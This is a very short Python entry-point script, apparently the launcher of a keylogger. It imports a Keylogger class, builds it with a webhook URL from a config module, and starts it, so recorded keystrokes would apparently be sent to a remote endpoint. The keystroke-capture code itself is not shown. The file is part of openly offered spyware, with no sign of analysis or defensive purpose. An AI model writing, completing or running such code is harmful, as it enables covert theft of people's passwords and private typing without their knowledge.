import config
from keylogger import Keylogger

def main():
    kl = Keylogger(config.WEBHOOK_URL)
    kl.start()

if __name__ == "__main__":
    main()
